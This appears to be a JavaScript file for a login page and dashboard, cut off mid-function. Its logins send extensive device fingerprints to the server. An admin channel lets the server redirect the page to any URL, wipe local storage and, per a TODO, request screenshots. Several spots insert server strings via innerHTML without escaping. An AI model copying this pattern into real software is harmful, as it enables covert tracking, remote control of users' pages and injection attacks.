javascript
// Global variables for client-side state
let currentUser = '';
let currentUserID = '';
let attempts = 3; // Client-side display for attempts, kept in sync by server responses.
let is24HourFormat = false;
let currentZoom = 1; // Tracks current zoom level for adjustZoom
let activityLogs = []; // Client-side activity logs (for dashboard display)
let loginHistory = []; // Client-side login history
let importantDates = []; // Important dates
let clickCount = 0; // Mouse clicker counter
let errorLogs = []; // Client-side error logs (for dashboard display)

// Client-side Performance Stats
let stats = {
  buttonPresses: 0,
  toggleSwitches: 0,
  panelsOpened: 0,
  panelsClosed: 0,
  searchQueries: 0,
  sessionStartTime: null
};
let isLightMode = false;

// Timer/Stopwatch variables
let stopwatchInterval = null;
let stopwatchTime = 0; // Time in centiseconds for stopwatch
let timerInterval = null;
let timerTime = 0; // Time in seconds for countdown timer
let isStopwatchRunning = false;
let isTimerRunning = false;

// Drawing Canvas variables
let isDrawing = false;
let currentTool = 'pen';
let currentColor = '#ff4500'; // Default pen color (matches dark theme accent)
let currentThickness = 2; // Default pen thickness
let canvas, ctx; // Canvas and its 2D rendering context

// Calculator variables
let calcDisplayValue = '0';
let calcCurrentExpression = ''; // The expression being built

// DOM elements
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const userIDInput = document.getElementById('userID');
const submitBtn = document.getElementById('submitBtn');
const errorMsg = document.getElementById('errorMsg');
const attemptsText = document.getElementById('attemptsText');
const resetPopup = document.getElementById('resetPopup');
const resetField = document.getElementById('resetField');
const resetBtn = document.getElementById('resetBtn');

// Dashboard elements (common)
const welcomeNotification = document.getElementById('welcomeNotification');
const loggedUserSpan = document.getElementById('loggedUser');
const currentUserSpan = document.getElementById('currentUser');
const currentUserIDSpan = document.getElementById('currentUserID');
const panelsGrid = document.getElementById('panelsGrid');
const announcementText = document.getElementById('announcementText'); // For server-set announcements
const systemUpdatesList = document.getElementById('systemUpdatesList'); // For server-set updates
const notificationsList = document.getElementById('notificationsList'); // For server-set notifications


// --- Backend API Base URL ---
const API_BASE_URL = window.location.origin + '/api'; // Calls Flask endpoints on the same server

// --- Socket.IO for Real-time Commands from Server ---
let socket = null; // Socket.IO client instance


// --- Client-Side Helper Functions ---

// Updates the remaining login attempts displayed on the UI
function updateAttemptsText() { attemptsText.textContent = `Attempts Left: ${attempts}`; }

// Disables login inputs and submit button
function disableInputs() { usernameInput.disabled = true; passwordInput.disabled = true; userIDInput.disabled = true; submitBtn.disabled = true; }

// Enables login inputs and submit button
function enableInputs() { usernameInput.disabled = false; passwordInput.disabled = false; userIDInput.disabled = false; submitBtn.disabled = false; }

// Shows the system lock/reset popup
function showResetPopup() { resetPopup.style.display = 'flex'; resetPopup.setAttribute('aria-hidden', 'false'); resetField.focus(); }

// Hides the system lock/reset popup
function hideResetPopup() { resetPopup.style.display = 'none'; resetPopup.setAttribute('aria-hidden', 'true'); resetField.value = ''; }

// Shows temporary notification popups on the screen
function showNotification(message) {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
    document.body.appendChild(notification);
    setTimeout(() => { notification.remove(); }, 3000);
}

// Logs client-side activity to the dashboard panel
function logActivity(activity) {
    const timestamp = new Date().toISOString();
    activityLogs.unshift({ timestamp, activity, id: Date.now() });
    if (activityLogs.length > 100) { activityLogs = activityLogs.slice(0, 100); }
    updateActivityLogDisplay();
}

// Logs client-side errors to the dashboard panel and console
function logError(message) {
    const timestamp = new Date().toISOString();
    errorLogs.unshift({ timestamp, message, id: Date.now() });
    if (errorLogs.length > 100) { errorLogs = errorLogs.slice(0, 100); }
    saveErrorLogsToStorage();
    updateErrorLogDisplay();
    console.error("[Client Error Log]: " + message);
}

// Parses user agent string for browser, OS, device info (no change)
function parseUserAgent() { /* ... (Your existing code) ... */
    const ua = navigator.userAgent; let browserName = "Unknown Browser"; let browserVersion = "Unknown"; let os = "Unknown OS"; let osVersion = "Unknown"; let engine = "Unknown Engine"; let deviceType = "Desktop";
    if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) { browserName = "Chrome"; browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown"; engine = "Blink"; }
    else if (/Firefox/.test(ua)) { browserName = "Firefox"; browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown"; engine = "Gecko"; }
    else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) { browserName = "Safari"; browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown"; engine = "WebKit"; }
    else if (/Edge/.test(ua)) { browserName = "Edge"; browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown"; engine = "EdgeHTML/Blink"; }
    else if (/OPR|Opera/.test(ua)) { browserName = "Opera"; browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown"; engine = "Blink/Presto"; }
    else if (/Trident/.test(ua) || /MSIE/.test(ua)) { browserName = "Internet Explorer"; browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown"; engine = "Trident"; }
    if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; } else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; } else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; } else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; } else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; } else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; } else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; } else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; }
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet"; if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";
    return { browserName, browserVersion, os, osVersion, engine, deviceType };
}

function getBrowserDetailedInfo() { /* ... (Your existing code, returning object for fetch) ... */
    const parsedUA = parseUserAgent(); return { rawUserAgent: navigator.userAgent, browserName: parsedUA.browserName, browserVersion: parsedUA.browserVersion, osName: parsedUA.os, osVersion: parsedUA.osVersion, renderingEngine: parsedUA.engine, deviceType: parsedUA.deviceType, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, language: navigator.language, onlineStatus: navigator.onLine, referrer: document.referrer, currentURL: window.location.href, windowInnerSize: `${window.innerWidth}x${window.innerHeight}`, windowOuterSize: `${window.outerWidth}x${window.outerHeight}`, viewportSize: `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`, webglSupport: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch (e) { return false; } })(), canvasSupport: !!window.CanvasRenderingContext2D, webRTcSupport: (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia), geolocationSupport: !!navigator.geolocation, webSocketsSupport: !!window.WebSocket, webWorkersSupport: !!window.Worker, batteryStatusAPI: !!navigator.getBattery, vibrationAPI: !!navigator.vibrate, mediaDevicesAPI: !!navigator.mediaDevices, webXRAPI: !!navigator.xr, gamepadAPI: !!navigator.getGamepads, webShareAPI: !!navigator.share, credentialManagementAPI: !!navigator.credentials, paymentRequestAPI: !!window.PaymentRequest, webAuthenticationAPI: !!navigator.credentials && !!navigator.credentials.create, indexedDBSupport: !!window.indexedDB, webSQLDBSupport: !!window.openDatabase, offscreenCanvasSupport: !!window.OffscreenCanvas, permissionsAPI: !!navigator.permissions, clipboardAPI: !!navigator.clipboard };
}
function getDeviceDetailedInfo() { /* ... (Your existing code, returning object for fetch) ... */
    const parsedUA = parseUserAgent(); return { osName: parsedUA.os, osVersion: parsedUA.osVersion, platform: navigator.platform, deviceType: parsedUA.deviceType, screenTotalWidth: screen.width, screenTotalHeight: screen.height, screenAvailableWidth: screen.availWidth, screenAvailableHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, devicePixelRatio: window.devicePixelRatio, screenOrientation: screen.orientation?.type, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, maxTouchPoints: navigator.maxTouchPoints, touchScreenSupport: (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)), keyboardMapSupport: !!navigator.keyboard, pointerLockAPI: !!document.exitPointerLock, speechRecognitionAPI: !!(window.SpeechRecognition || window.webkitSpeechRecognition), speechSynthesisAPI: !!window.speechSynthesis, usbAPI: !!navigator.usb, bluetoothAPI: !!navigator.bluetooth, nfcAPI: !!navigator.nfc, accelerometerSupport: !!window.DeviceMotionEvent, gyroscopeSupport: !!window.DeviceOrientationEvent, magnetometerSupport: !!window.DeviceOrientationEvent, ambientLightSensorSupport: 'ondevicelight' in window, proximitySensorSupport: 'ondeviceproximity' in window, mediaCapabilitiesAPI: !!navigator.mediaCapabilities, virtualKeyboardAPI: !!navigator.virtualKeyboard, userActivationAPI: !!navigator.userActivation };
}
function getConnectionDetailedInfo() { /* ... (Your existing code, returning object for fetch) ... */
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection; const nav = navigator; return { onlineStatus: nav.onLine, connectionType: connection?.type, effectiveConnectionType: connection?.effectiveType, downlinkSpeed: connection?.downlink, rtt: connection?.rtt, saveDataMode: connection?.saveData, networkDownlinkMax: connection?.downlinkMax, networkMeteredConnection: connection?.metered, webTransportAPI: !!window.WebTransport, beaconAPI: !!nav.sendBeacon, backgroundSyncAPI: !!('serviceWorker' in nav && nav.serviceWorker && nav.serviceWorker.ready && nav.serviceWorker.ready.then && 'sync' in (nav.serviceWorker.controller || {})), fetchPriorityAPI: !!(new Request('/', {priority: 'high'})).priority, dnsPrefetchingSupport: true, preloadSupport: true, prerenderSupport: !!document.createElement('link').relList?.supports('prerender'), networkInformationAPI: !!nav.connection, serviceWorkerStatus: 'serviceWorker' in nav ? (nav.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported' };
}


// --- Authentication Flow (Client-side calls to Server-side API) ---

// Loads the whitelist data from the backend API (for client-side display/reference, not auth)
async function loadWhitelist() {
    try {
        const response = await fetch(`${API_BASE_URL}/whitelist`);
        if (!response.ok) { throw new Error(`HTTP error! status: ${response.status}`); }
        const data = await response.json();
        // Client-side whitelist is not used for auth, but can be for display/reference if needed.
        console.log("Whitelist loaded via API (for reference).");
        logActivity("Whitelist loaded successfully from API.");
    } catch (error) {
        console.error("Failed to load whitelist from API:", error);
        logError(`Failed to load whitelist from API: ${error.message}`);
    }
}


// Main login attempt, sends credentials and client info to the backend Flask API
async function attemptLogin() {
    const username = usernameInput.value;
    const password = passwordInput.value;
    const userID = userIDInput.value;

    updateAttemptsText(); // Update client-side UI immediately

    const client_info = { // Gather client environment data
        browser_info: getBrowserDetailedInfo(),
        device_info: getDeviceDetailedInfo(),
        connection_info: getConnectionDetailedInfo(),
        current_url: window.location.href,
        timestamp: new Date().toISOString(),
        // client_ip is intentionally left blank here; server determines actual client IP.
    };

    try {
        const response = await fetch(`${API_BASE_URL}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: username,
                password: password,
                userID: userID,
                client_info: client_info,
            }),
        });

        const result = await response.json();
        console.log("Login API response:", result);

        if (result.status === 'success') {
            attempts = result.attempts_left; // Sync attempts from server
            await successfulLogin(username, userID);
        } else {
            attempts = result.attempts_left; // Sync attempts from server
            await failedLogin(username, userID, result.message || "Invalid credentials.");
        }
    } catch (error) {
        console.error('Network or server error during login API call:', error);
        showError('Failed to connect to login server. Please try again later.');
        logError(`Network or API connection failed during login: ${error.message}`);
        // Client-side default attempt decrement if server connection itself is an issue
        attempts--;
        if (attempts <= 0) { disableInputs(); showResetPopup(); }
        updateAttemptsText();
    }
}

// Actions to take upon successful login
async function successfulLogin(username, userID) {
    currentUser = username;
    currentUserID = userID;

    loginHistory.unshift({ time: new Date().toISOString(), success: true, username: username });
    saveLoginHistoryToStorage(); // Persist login locally

    // --- Connect to Socket.IO after successful login ---
    // Pass user ID and username as query params for server to identify the client
    socket = io({ query: { userID: currentUserID, username: currentUser } });

    socket.on('connect', () => {
        console.log('Socket.IO connected!', socket.id);
        logActivity('Real-time connection established.');
        // Server will register the user via handshake. Client only sends this if explicit identification needed
        // socket.emit('user_id_init', { userID: currentUserID, username: currentUser }); // Can be explicit if needed
    });

    socket.on('disconnect', () => {
        console.log('Socket.IO disconnected.');
        logActivity('Real-time connection disconnected.');
    });

    // --- Handle commands sent from the server (Discord bot -> Flask -> Socket.IO -> Client) ---
    socket.on('server_command', (data) => {
        console.log('Received command from server:', data);
        logActivity(`Received command '${data.command}' from server.`);
        showNotification(`Command from admin: ${data.command}`); // Generic notification

        // --- Implement Client-Side Command Execution ---
        if (data.command === 'panic') {
            window.location.href = data.url || 'about:blank';
        } else if (data.command === 'zoom') {
            const zoomLevel = parseFloat(data.level) / 100; // Normalize to 0.5-2 range from percentage
            document.body.style.zoom = Math.max(0.5, Math.min(2, zoomLevel));
            currentZoom = zoomLevel; // Update internal zoom state
        } else if (data.command === 'logout') {
            showNotification(data.message || 'You have been logged out by administrator.');
            setTimeout(logout, 2000); // Give time for message, then log out
        } else if (data.command === 'restart_page') {
             showNotification('System is restarting by administrator command.');
             setTimeout(restartSystem, 2000);
        } else if (data.command === 'clear_updates') {
            // Example: Clear a specific UI element for updates
            const updatesList = document.getElementById('systemUpdatesList');
            if (updatesList) updatesList.innerHTML = '<div class="system-update-item">Updates cleared by admin.</div>';
            showNotification('System updates cleared by admin.');
        } else if (data.command === 'clear_notifications') {
            notificationsList.innerHTML = '<div class="p-2 bg-blue-900 rounded text-xs">Notifications cleared by admin.</div>';
            showNotification('Notifications cleared by admin.');
        } else if (data.command === 'clear_activity') {
            clearActivityLogs(); // Use existing client-side function
            showNotification('Activity logs cleared by admin.');
        } else if (data.command === 'clear_errors') {
            clearErrorLogs(); // Use existing client-side function
            showNotification('Error logs cleared by admin.');
        } else if (data.command === 'clear_login_history') {
            loginHistory = []; saveLoginHistoryToStorage(); updateLoginHistoryDisplay();
            showNotification('Login history cleared by admin.');
        } else if (data.command === 'clear_all_data') {
            // This is a drastic command, clear all local storage and reload
            showNotification('All local data cleared by admin. System restarting.');
            setTimeout(() => { localStorage.clear(); location.reload(); }, 2000);
        } else if (data.command === 'set_clicks') {
            clickCount = data.count; updateClickCountDisplay();
            showNotification(`Click counter set to ${data.count} by admin.`);
        } else if (data.command === 'clear_clicks') {
            clickCount = 0; updateClickCountDisplay();
            showNotification('Click counter cleared by admin.');
        } else if (data.command === 'set_announcement') {
            if (announcementText) announcementText.textContent = data.message;
            showNotification('Announcement updated by admin.');
        } else if (data.command === 'set_theme') {
            // This would require more complex client-side logic to apply a theme by name
            // For now, just toggle or apply a specific one.
            if (data.theme_name === 'light') document.body.classList.add('light-theme');
            else if (data.theme_name === 'dark') document.body.classList.remove('light-theme');
            showNotification(`Theme set to ${data.theme_name} by admin.`);
        } else if (data.command === 'set_dashboard_color') {
            document.documentElement.style.setProperty('--accent-color', data.color);
            document.documentElement.style.setProperty('--accent-secondary', data.color); // Or a derived secondary
            showNotification(`Dashboard color set to ${data.color} by admin.`);
        } else if (data.command === 'set_event') {
            // This would add an event to the important dates panel
            addImportantDate(data.event_name, new Date().toISOString().split('T')[0], new Date().toTimeString().slice(0,5)); // Simplified
            showNotification(`Event '${data.event_name}' set by admin.`);
        } else if (data.command === 'control_section') {
            const targetPanel = document.querySelector(`[data-panel="${data.section}"]`);
            if (targetPanel) {
                if (data.action === 'remove') targetPanel.style.display = 'none';
                else if (data.action === 'enable') targetPanel.style.display = 'block';
                showNotification(`Section '${data.section}' ${data.action}d by admin.`);
            }
        }
        // TODO: Implement screenshot_request: client captures screen, then POSTs image data to a Flask API endpoint.
    });

    // Visual transition to dashboard
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('loadingScreen').classList.remove('hidden');
    generateCodeRain('loadingCodeRain'); // Loading screen animation

    setTimeout(() => {
        document.getElementById('loadingScreen').classList.add('hidden');
        document.getElementById('dashboard').classList.add('active');
        initializeDashboard(); // Initialize dashboard view
    }, 3000); // 3-second loading animation
}

// Actions to take upon failed login attempt
async function failedLogin(attemptedUsername, attemptedUserID, message) {
    // attempts is already synced by server response.
    updateAttemptsText(); // Update UI immediately

    // Visual feedback for failed login
    document.getElementById('loginBox').classList.add('error-shake');
    setTimeout(() => { document.getElementById('loginBox').classList.remove('error-shake'); }, 500);

    showError(message); // Display error message from server

    if (attempts <= 0) { // If server reported 0 attempts left
        showError('No attempts remaining. System locked.');
        disableInputs(); // Disable inputs
        showResetPopup(); // Show reset popup
    }

    loginHistory.unshift({ time: new Date().toISOString(), success: false, username: attemptedUsername });
    saveLoginHistoryToStorage(); // Persist login locally
}


// Server-side controlled reset logic via API call
async function resetCounter() {
    const enteredCode = resetField.value.trim();
    const client_info = { // Gather client info
        browser_info: getBrowserDetailedInfo(),
        device_info: getDeviceDetailedInfo(),
        connection_info: getConnectionDetailedInfo(),
        current_url: window.location.href,
        timestamp: new Date().toISOString(),
    };

    try {
        const response = await fetch(`${API_BASE_URL}/reset_attempts`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ reset_code: enteredCode, client_info: client_info }),
        });
        const result = await response.json();
        console.log("Reset API response:", result);

        if (result.status === 'success') {
            attempts = result.new_attempts_count; // Sync attempts from server
            updateAttemptsText();
            enableInputs();
            hideResetPopup();
            errorMsg.textContent = ''; // Clear error message
            showNotification(result.message || "Login attempts reset successfully!");
            logActivity("Login attempts reset via code (server confirmed).");
        } else {
            alert(result.message || 'Incorrect reset code. Try again.');
            logError("Incorrect reset code entered on client (server rejected): " + enteredCode);
        }
    } catch (error) {
        console.error('Network or server error during reset API call:', error);
        alert('Failed to connect to reset server. Please try again later.');
        logError(`Network or API connection failed during reset: ${error.message}`);
    }
}

// Displays temporary error messages on the login screen
function showError(message) { /* ... (Your existing code) ... */
    errorMsg.textContent = message;
    console.error("[Client Error]: " + message);
    logError(message);
    setTimeout(() => { errorMsg.textContent = ''; }, 5000);
}


// --- Initialization Sequence (no changes) ---
window.addEventListener('load', () => { /* ... (Your existing code) ... */
  console.log("DOM fully loaded and parsed. Starting initialization sequence.");
  startInitialization();
  loadLoginHistoryFromStorage();
  loadImportantDatesFromStorage();
  loadClickCountFromStorage();
  loadErrorLogsFromStorage();
  loadWhitelist();
  updateAttemptsText();
});
function startInitialization() { /* ... (Your existing code) ... */
  console.log("startInitialization() called."); generateCodeRain('codeRain'); setTimeout(() => { document.getElementById('initText').textContent = 'Initializing Login Page...'; console.log("Initialization text updated. Preparing for login screen transition."); setTimeout(() => { const initScreen = document.getElementById('initScreen'); const loginScreen = document.getElementById('loginScreen'); if (initScreen) initScreen.classList.add('hidden'); else console.warn("Element with ID 'initScreen' not found."); if (loginScreen) loginScreen.classList.remove('hidden'); else console.error("Element with ID 'loginScreen' not found! Cannot display login page."); startClock(); console.log("Clock started. Login page ready."); }, 2000); }, 3000);
}
function generateCodeRain(containerId) { /* ... (Your existing code) ... */
    const container = document.getElementById(containerId); if (!container) { console.warn(`Code rain container with ID ${containerId} not found.`); return; }
    console.log(`Generating code rain for '${containerId}'...`); container.innerHTML = '';
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'; const numChars = 100;
    for (let i = 0; i < numChars; i++) { const charElement = document.createElement('div'); charElement.className = 'code-char'; charElement.textContent = chars[Math.floor(Math.random() * chars.length)]; charElement.style.left = Math.random() * 100 + '%'; charElement.style.animationDelay = Math.random() * 5 + 's'; charElement.style.animationDuration = Math.random() * 10 + 5 + 's'; container.appendChild(charElement); }
    console.log(`Generated ${numChars} code rain elements.`);
}

// Starts and continuously updates the real-time clock (no change)
function startClock() { updateClock(); setInterval(updateClock, 1000); }
// Updates time and date displays (no change)
function updateClock() {
  const now = new Date(); const timeOptions = { hour12: !is24HourFormat, hour: '2-digit', minute: '2-digit', second: '2-digit' }; const time = now.toLocaleTimeString('en-US', timeOptions);
  const date = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
  document.getElementById('currentTime').textContent = time; document.getElementById('currentDate').textContent = date;
  const quickbarRealTimeClock = document.getElementById('quickbarCurrentTime'); if (quickbarRealTimeClock) { quickbarRealTimeClock.textContent = time; }
}


// --- Dashboard Core Functions (mostly unchanged) ---
function adjustZoom(delta) { currentZoom = Math.max(0.5, Math.min(2, currentZoom + delta)); document.body.style.zoom = currentZoom; logActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%'); }
function setupToggles() {
  document.getElementById('showPasswordToggle').addEventListener('click', function() { this.classList.toggle('active'); const passwordField = document.getElementById('password'); passwordField.type = this.classList.contains('active') ? 'text' : 'password'; stats.toggleSwitches++; logActivity('Password visibility toggled'); });
  document.getElementById('timeFormatToggle').addEventListener('click', function() { this.classList.toggle('active'); is24HourFormat = this.classList.contains('active'); stats.toggleSwitches++; logActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour')); updateClock(); });
}
function initializeDashboard() { /* ... (Your existing code) ... */
  stats.sessionStartTime = Date.now();
  loggedUserSpan.textContent = currentUser; currentUserSpan.textContent = currentUser; currentUserIDSpan.textContent = currentUserID;
  welcomeNotification.style.display = 'block'; setTimeout(() => { welcomeNotification.style.display = 'none'; }, 5000);
  generateCalendar(); initializeCanvas(); startSessionTimer(); updateClock();
  updateStats(); updateLoginHistoryDisplay(); updateImportantDatesDisplay();
  updateClickCountDisplay(); updateErrorLogDisplay();
  logActivity('Dashboard initialized successfully for user: ' + currentUser);
}
function generateCalendar() { /* ... (Your existing code) ... */
  const calendar = document.getElementById('calendarGrid'); calendar.innerHTML = ''; const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']; const today = new Date(); const currentMonth = today.getMonth(); const currentYear = today.getFullYear(); days.forEach(day => { const dayElement = document.createElement('div'); dayElement.textContent = day; dayElement.className = 'calendar-cell text-xs font-bold text-gray-400'; calendar.appendChild(dayElement); }); const firstDay = new Date(currentYear, currentMonth, 1).getDay(); const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate(); for (let i = 0; i < firstDay; i++) { const emptyCell = document.createElement('div'); emptyCell.className = 'calendar-cell'; calendar.appendChild(emptyCell); } for (let day = 1; day <= daysInMonth; day++) { const dayCell = document.createElement('div'); dayCell.textContent = day; dayCell.className = 'calendar-cell'; if (day === today.getDate() && currentMonth === today.getMonth() && currentYear === today.getFullYear()) { dayCell.classList.add('today'); } calendar.appendChild(dayCell); }
}
function initializeCanvas() { /* ... (Your existing code) ... */
  canvas = document.getElementById('drawingCanvas'); ctx = canvas.getContext('2d'); canvas.addEventListener('mousedown', startDrawing); canvas.addEventListener('mousemove', draw); canvas.addEventListener('mouseup', stopDrawing); canvas.addEventListener('mouseout', stopDrawing);
}
function startDrawing(e) { /* ... (Your existing code) ... */
  isDrawing = true; const rect = canvas.getBoundingClientRect(); const x = e.clientX - rect.left; const y = e.clientY - rect.top; ctx.beginPath(); ctx.moveTo(x, y);
}
function draw(e) { /* ... (Your existing code) ... */
  if (!isDrawing) return; const rect = canvas.getBoundingClientRect(); const x = e.clientX - rect.left; const y = e.clientY - rect.top; ctx.lineWidth = currentThickness; ctx.lineCap = 'round'; ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor; ctx.lineTo(x, y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(x, y);
}
function stopDrawing() { /* ... (Your existing code) ... */
  isDrawing = false; ctx.beginPath();
}
function startSessionTimer() { /* ... (Your existing code) ... */
  setInterval(() => {
    if (stats.sessionStartTime) {
      const elapsed = Math.floor((Date.now() - stats.sessionStartTime) / 1000); const hours = Math.floor(elapsed / 3600); const minutes = Math.floor((elapsed % 3600) / 60); const seconds = elapsed % 60;
      const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      const mainSessionTime = document.getElementById('sessionTime'); if (mainSessionTime) { mainSessionTime.textContent = timeString; }
      const quickbarSessionTime = document.getElementById('quickbarSessionTime'); if (quickbarSessionTime) { quickbarSessionTime.textContent = timeString; }
    }
  }, 1000);
}

// Utility and Dashboard Control Functions (mostly unchanged)
function togglePanel(panelId) { const panel = document.getElementById(panelId); if (!panel) { console.error(`Panel with ID '${panelId}' not found.`); return; } const isVisible = panel.style.display === 'flex' || panel.style.display === 'block'; if (panel.classList.contains('settings-modal')) { panel.style.display = isVisible ? 'none' : 'flex'; } else { panel.style.display = isVisible ? 'none' : 'block'; } if (!isVisible) { stats.panelsOpened++; logActivity(`Panel opened: ${panelId}`); } else { stats.panelsClosed++; logActivity(`Panel closed: ${panelId}`); } updateStats(); }
function minimizePanel(button) { const panel = button.closest('.panel'); if (!panel) { console.error("Could not find parent panel for minimize button."); return; } const content = panel.querySelector('.panel-header').nextElementSibling; if (content.style.display === 'none') { content.style.display = 'block'; button.innerHTML = '<i class="fas fa-minus"></i>'; } else { content.style.display = 'none'; button.innerHTML = '<i class="fas fa-plus"></i>'; } stats.buttonPresses++; logActivity('Panel minimized/restored'); }
function closePanel(button) { const panel = button.closest('.panel'); if (!panel) { console.error("Could not find parent panel for close button."); return; } panel.style.display = 'none'; stats.panelsClosed++; stats.buttonPresses++; logActivity(`Panel closed: ${panel.dataset.panel}`); updateStats(); }
function performSearch() { const query = document.getElementById('searchBar').value.toLowerCase(); if (!query) return; stats.searchQueries++; logActivity(`Searched for: '${query}'`); const panels = document.querySelectorAll('.panels-grid > .panel'); let found = false; panels.forEach(panel => { const text = panel.textContent.toLowerCase(); const panelTitle = panel.querySelector('.panel-title')?.textContent.toLowerCase(); if (text.includes(query) || (panelTitle && panelTitle.includes(query))) { panel.style.display = 'block'; panel.style.border = '2px solid var(--accent-color)'; found = true; setTimeout(() => { panel.style.border = '1px solid var(--border-color)'; }, 2000); } }); if (!found) { showNotification("No matching panels found."); console.warn("Search failed: No matching panels found for query '" + query + "'."); } updateStats(); }
function updateActivityLogDisplay() { const container = document.getElementById('activityLogsList'); if (!container) return; container.innerHTML = ''; activityLogs.slice(0, 10).forEach(log => { const logElement = document.createElement('div'); logElement.className = 'log-entry'; logElement.innerHTML = `<span>${log.activity}</span><span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>`; container.appendChild(logElement); }); }
function updateErrorLogDisplay() { const container = document.getElementById('errorLogsList'); if (!container) return; container.innerHTML = ''; errorLogs.slice(0, 10).forEach(err => { const errorElement = document.createElement('div'); errorElement.className = 'error-log-entry'; errorElement.innerHTML = `<span>${err.message}</span><span class="log-time">${new Date(err.timestamp).toLocaleTimeString()}</span>`; container.appendChild(errorElement); }); }
function clearErrorLogs() { if (confirm("Are you sure you want to clear all error logs? This cannot be undone locally.")) { errorLogs = []; saveErrorLogsToStorage(); updateErrorLogDisplay(); showNotification("Error logs cleared locally."); logActivity("Error logs cleared locally."); } }
function downloadErrorLogs() { const data = { errorLogs: errorLogs, timestamp: new Date().toISOString() }; const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `error_logs_${new Date().toISOString().split('T')[0]}.json`; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); showNotification("Error logs downloaded locally."); logActivity("Error logs downloaded."); stats.buttonPresses++; updateStats(); }

// Local Storage (no changes)
function saveLoginHistoryToStorage() { localStorage.setItem('loginHistory', JSON.stringify(loginHistory)); }
function loadLoginHistoryFromStorage() { const storedHistory = localStorage.getItem('loginHistory'); if (storedHistory) { loginHistory = JSON.parse(storedHistory); } updateLoginHistoryDisplay(); }
function saveImportantDatesToStorage() { localStorage.setItem('importantDates', JSON.stringify(importantDates)); }
function loadImportantDatesFromStorage() { const storedDates = localStorage.getItem('importantDates'); if (storedDates) { importantDates = JSON.parse(storedDates); } updateImportantDatesDisplay(); }
function saveClickCountToStorage() { localStorage.setItem('mouseClickCount', clickCount); }
function loadClickCountFromStorage() { const storedClickCount = localStorage.getItem('mouseClickCount'); if (storedClickCount !== null) { clickCount = parseInt(storedClickCount); } updateClickCountDisplay(); }
function saveErrorLogsToStorage() { localStorage.setItem('errorLogs', JSON.stringify(errorLogs)); }
function loadErrorLogsFromStorage() { const storedErrorLogs = localStorage.getItem('errorLogs'); if (storedErrorLogs) { errorLogs = JSON.parse(storedErrorLogs); } updateErrorLogDisplay(); }

// Display Updates (no changes)
function updateLoginHistoryDisplay() { const container = document.getElementById('loginHistoryList'); if (!container) return; container.innerHTML = ''; loginHistory.slice(0, 10).forEach(entry => { const logElement = document.createElement('div'); const statusClass = entry.success ? 'success' : 'failed'; logElement.className = `login-entry-container ${statusClass}`; logElement.innerHTML = `<div class="flex-grow"><span class="login-entry-status">${entry.success ? 'SUCCESS' : 'FAILED'}:</span> <span>User "${entry.username || 'unknown'}"</span></div><span class="log-time">${new Date(entry.time).toLocaleString()}</span>`; container.appendChild(logElement); }); }
function addImportantDate(eventDescription = '', date = new Date().toISOString().split('T')[0], time = new Date().toTimeString().slice(0,5)) { // Added defaults for server commands
    const dateInput = document.getElementById('importantDateDay').value = date;
    const timeInput = document.getElementById('importantDateTime').value = time;
    const eventInput = document.getElementById('importantDateEvent').value = eventDescription;

